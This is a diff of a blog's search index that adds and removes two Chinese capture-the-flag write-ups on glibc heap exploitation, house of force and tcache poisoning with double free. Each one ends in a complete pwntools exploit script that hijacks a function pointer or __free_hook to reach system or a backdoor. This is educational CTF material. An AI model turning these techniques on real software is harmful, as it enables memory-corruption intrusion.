@@ -60,6 +60,90 @@
 ]]></content>
   </entry>
   <entry>
+    <title>初步探讨house of force</title>
+    <url>/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/</url>
+    <content><![CDATA[<p>本篇呢主要是讲讲我对house  of  force 的一个初步的理解，house of force呢算是堆利用手法中一个入门的手法，本人也是刚接触堆，所以还有很多地方不是很懂。</p>
+<p>什么是 house of force呢，简单来说就是通过控制top_chunk的size位，将top_chunk更新到任意一个地址，从而能够通过申请堆块可以任意地址写。</p>
+<p>那么这里就有问题了，为什么通过控制size位的大小就能申请堆块达到任意写了呢？</p>
+<p>我们先来看看  glibc对于top chunk的验证：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) <span class="comment">#top_chunk的大小&gt;=你申请堆块的大小+最小size  </span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, <span class="built_in">bytes</span>);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>
+
+<p>主要意思就是只要通过这个if语句，那么就可以通过对top_chunk的认证，那么重点来了，我们怎么样可以申请任意大小size的堆块呢，很明显只要通过这个if语句就行了，也就是把**(unsigned long) (size)**做到无限大，那么什么样的数在unsigned long 才是无限大呢，可以告诉你的是 -1是最大的，-1大于所有负整数也大于有符号的正整数。</p>
+<p>所以我们可以将top_chunk的size大小设置为<em><strong>0xffffffffffffffff</strong></em>这样我们就可以申请任意大小的堆块地址啦（当然仅限于在<strong>2.23和2.27</strong>的libc版本）。</p>
+<p>找一个例题</p>
+<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><p>链接：<a href="https://pan.baidu.com/s/1slc_CFbR2ViFrwpRW8Ty4w">https://pan.baidu.com/s/1slc_CFbR2ViFrwpRW8Ty4w</a><br>提取码：chen</p>
+<p>查看保护</p>
+<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/1.png" alt="1689504121976"></p>
+<p>没有开启pie，rerlo也没有全开。</p>
+<p>查看主函数<img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/2.png" alt="1689504536074"></p>
+<p>可以看到该程序一开始申请了一个0x10的堆块；</p>
+<p>将 hello_message 函数的地址赋给 v4 指向的第一个函数指针；</p>
+<p>将 goodbye_message 函数的地址赋给 v4 指向的第二个函数指针；</p>
+<p>然后**(*v4)()**表示调用了v4 指向的第一个函数指针，简单来说就是执行了第一个函数；</p>
+<p>后面就是构造了一个菜单；</p>
+<p>输入5的时候 **v4[1] () **表示调用了v4 指向的第二个函数指针，然后退出。</p>
+<p>可以看到该函数还有一个后门</p>
+<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/3.png" alt="1689505691847"></p>
+<p>现在我们的初步的思路就是，让程序去执行这个后门函数从而获取到flag，那么很容易就能想到我们可以使用上面我说的v4这个堆块，改变他第二个函数的指针为后门函数的地址从而让程序去执行这个后门函数,那么怎么修改呢，我们当然只能通过修改v4这个堆块来实现。</p>
+<p>可是v4这个堆块是系统自己申请的，我们无法利用菜单直接进行修改，但是我们可以通过house of force 来把v4这个堆块再次放入到top_chunk里面（为什么说<strong>再次</strong>呢，因为一般的堆块都是由top_chunk切割而来的）这样我们就可以控制v4这个堆块啦。</p>
+<p>那么具体怎么操作呢？</p>
+<p>首先我们先申请一个0x30的堆块（为了通过堆溢出来修改top_chunk的size做准备）</p>
+<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/4.png" alt="1689506951144"></p>
+<p>然后通过溢出修改top_chunk的size位为<strong>0xffffffffffffffff</strong></p>
+<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/5.png" alt="1689507156442"></p>
+<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/6.png" alt="1689507328332"></p>
+<p>接下来我们申请-0x70的堆块（依然满足修改后的if判断），这样top_chunk的指针刚好就可以到达v4堆块</p>
+<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/7.png" alt="1689507619495"></p>
+<p>最后就可以把v4再申请出来修改指针啦</p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>,<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">ind,index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the new name of the item:&#x27;</span>,<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;aaaa&quot;</span>)<span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(-<span class="number">0x70</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x400D49</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>悄悄插一句，这个方法只能打通本地，因为这个后门是假的，打远端还得用unlink……</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>tcache-poisoning-doublefree</title>
+    <url>/2023/07/07/tcache-poisoning-doublefree/</url>
+    <content><![CDATA[<h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h1><p>主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址，简单来说就是将堆的fd指针修改为”__free_hook”，执行我们想要的比如system；</p>
+<h1 id="doublefree"><a href="#doublefree" class="headerlink" title="doublefree"></a>doublefree</h1><p>其实就是同一个指针free两次。虽然一般把它叫做double free。其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞；</p>
+<p>接下来我将主要演示一下在做题时doublefree的表示（包含tcache poisoning）：</p>
+<p>以下纯属作者个人的理解</p>
+<p>咱们的目的主要是想让程序执行我们准备的恶意堆块，那应该怎么做呢，很显然就得利用到doublefree了，举个例子</p>
+<p>申请一个0x60（假设为堆块A）的堆块，连续free两次时会出现：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/1.png"></p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/2.png"></p>
+<p>可以看到堆块A的fd指针指向了堆块A，可是这有什么用呢，当然有用，这时候我们可以在申请一个同样大小的堆块B，这个堆块我们可以控制，这也就代表我们控制了堆块A的fd指针的指向…..假设我们在堆块B中写入free hook的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/3.png"></p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/4.png"></p>
+<p>可以看到这个时候堆块A的fd指针已经指向了堆块B，那么这个时候我们再把堆块A申请出来就可以了，再将freehook指针指向比如system这样就达到了我的目的。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/5.png" alt="add(堆块A)"></p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/6.png" alt="add(加入system)"></p>
+<p>可以看到freehook的指针已经指向system,这样就成功调用了system</p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/7.png" alt="system的地址"></p>
+<p>接下看来以[ACTF_2019_message]为例</p>
+<h1 id="ACTF-2019-message"><a href="#ACTF-2019-message" class="headerlink" title="ACTF_2019_message"></a>ACTF_2019_message</h1><p>题目源文件</p>
+<p>[链接：<a href="https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A">https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A</a>  </p>
+<p>提取码：chen]:</p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/8.png"></p>
+<p>一个菜单题，有输入和输出，经过检查不存在UAF。</p>
+<p>查看保护：</p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/9.png"></p>
+<p>没有开PIE，RELRO全部开启。</p>
+<p>题目中没有给libc库（很难受），本人以18.04的ubuntu用tcache poisoning + doublefree的方法解决的（远端估计打不通），使用的libc版本为libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc-2.27.so</p>
+<p>由于题比较简单，不作一一解释</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25689)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#debug(p,0x00000000400A92)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;message:\n&#x27;</span> , <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;delete:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;edit:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;display:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1    #unsortedbin</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)<span class="comment">#3  #unsortedbin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#print(hex(leak))</span></span><br><span class="line">libc_base=leak-<span class="number">0x3ebca0</span></span><br><span class="line">free = libc_base+<span class="number">0x3ed8e8</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#free = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>如何在qq群里部署chat</title>
     <url>/2023/05/07/%E5%A6%82%E4%BD%95%E5%9C%A8qq%E7%BE%A4%E9%87%8C%E9%83%A8%E7%BD%B2chat/</url>
     <content><![CDATA[<p>本篇主要讲的是mirai和go-cqhttp在windos下的部署</p>
@@ -123,90 +207,6 @@
 <p>记住要挂梯子哟！！！</p>
 <hr>
 <p>注：本人是纯小白，肯定有错误的，看了还是不行的去网上查，我也是从网上查一步步做出来的，加油！！！！</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>tcache-poisoning-doublefree</title>
-    <url>/2023/07/07/tcache-poisoning-doublefree/</url>
-    <content><![CDATA[<h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h1><p>主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址，简单来说就是将堆的fd指针修改为”__free_hook”，执行我们想要的比如system；</p>
-<h1 id="doublefree"><a href="#doublefree" class="headerlink" title="doublefree"></a>doublefree</h1><p>其实就是同一个指针free两次。虽然一般把它叫做double free。其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞；</p>
-<p>接下来我将主要演示一下在做题时doublefree的表示（包含tcache poisoning）：</p>
-<p>以下纯属作者个人的理解</p>
-<p>咱们的目的主要是想让程序执行我们准备的恶意堆块，那应该怎么做呢，很显然就得利用到doublefree了，举个例子</p>
-<p>申请一个0x60（假设为堆块A）的堆块，连续free两次时会出现：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/1.png"></p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/2.png"></p>
-<p>可以看到堆块A的fd指针指向了堆块A，可是这有什么用呢，当然有用，这时候我们可以在申请一个同样大小的堆块B，这个堆块我们可以控制，这也就代表我们控制了堆块A的fd指针的指向…..假设我们在堆块B中写入free hook的地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/3.png"></p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/4.png"></p>
-<p>可以看到这个时候堆块A的fd指针已经指向了堆块B，那么这个时候我们再把堆块A申请出来就可以了，再将freehook指针指向比如system这样就达到了我的目的。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/5.png" alt="add(堆块A)"></p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/6.png" alt="add(加入system)"></p>
-<p>可以看到freehook的指针已经指向system,这样就成功调用了system</p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/7.png" alt="system的地址"></p>
-<p>接下看来以[ACTF_2019_message]为例</p>
-<h1 id="ACTF-2019-message"><a href="#ACTF-2019-message" class="headerlink" title="ACTF_2019_message"></a>ACTF_2019_message</h1><p>题目源文件</p>
-<p>[链接：<a href="https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A">https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A</a>  </p>
-<p>提取码：chen]:</p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/8.png"></p>
-<p>一个菜单题，有输入和输出，经过检查不存在UAF。</p>
-<p>查看保护：</p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/9.png"></p>
-<p>没有开PIE，RELRO全部开启。</p>
-<p>题目中没有给libc库（很难受），本人以18.04的ubuntu用tcache poisoning + doublefree的方法解决的（远端估计打不通），使用的libc版本为libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc-2.27.so</p>
-<p>由于题比较简单，不作一一解释</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25689)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#debug(p,0x00000000400A92)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;message:\n&#x27;</span> , <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;delete:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;edit:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;display:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1    #unsortedbin</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)<span class="comment">#3  #unsortedbin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#print(hex(leak))</span></span><br><span class="line">libc_base=leak-<span class="number">0x3ebca0</span></span><br><span class="line">free = libc_base+<span class="number">0x3ed8e8</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#free = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-  </entry>
-  <entry>
-    <title>初步探讨house of force</title>
-    <url>/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/</url>
-    <content><![CDATA[<p>本篇呢主要是讲讲我对house  of  force 的一个初步的理解，house of force呢算是堆利用手法中一个入门的手法，本人也是刚接触堆，所以还有很多地方不是很懂。</p>
-<p>什么是 house of force呢，简单来说就是通过控制top_chunk的size位，将top_chunk更新到任意一个地址，从而能够通过申请堆块可以任意地址写。</p>
-<p>那么这里就有问题了，为什么通过控制size位的大小就能申请堆块达到任意写了呢？</p>
-<p>我们先来看看  glibc对于top chunk的验证：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) <span class="comment">#top_chunk的大小&gt;=你申请堆块的大小+最小size  </span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, <span class="built_in">bytes</span>);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>
-
-<p>主要意思就是只要通过这个if语句，那么就可以通过对top_chunk的认证，那么重点来了，我们怎么样可以申请任意大小size的堆块呢，很明显只要通过这个if语句就行了，也就是把**(unsigned long) (size)**做到无限大，那么什么样的数在unsigned long 才是无限大呢，可以告诉你的是 -1是最大的，-1大于所有负整数也大于有符号的正整数。</p>
-<p>所以我们可以将top_chunk的size大小设置为<em><strong>0xffffffffffffffff</strong></em>这样我们就可以申请任意大小的堆块地址啦（当然仅限于在<strong>2.23和2.27</strong>的libc版本）。</p>
-<p>找一个例题</p>
-<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><p>链接：<a href="https://pan.baidu.com/s/1slc_CFbR2ViFrwpRW8Ty4w">https://pan.baidu.com/s/1slc_CFbR2ViFrwpRW8Ty4w</a><br>提取码：chen</p>
-<p>查看保护</p>
-<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/1.png" alt="1689504121976"></p>
-<p>没有开启pie，rerlo也没有全开。</p>
-<p>查看主函数<img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/2.png" alt="1689504536074"></p>
-<p>可以看到该程序一开始申请了一个0x10的堆块；</p>
-<p>将 hello_message 函数的地址赋给 v4 指向的第一个函数指针；</p>
-<p>将 goodbye_message 函数的地址赋给 v4 指向的第二个函数指针；</p>
-<p>然后**(*v4)()**表示调用了v4 指向的第一个函数指针，简单来说就是执行了第一个函数；</p>
-<p>后面就是构造了一个菜单；</p>
-<p>输入5的时候 **v4[1] () **表示调用了v4 指向的第二个函数指针，然后退出。</p>
-<p>可以看到该函数还有一个后门</p>
-<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/3.png" alt="1689505691847"></p>
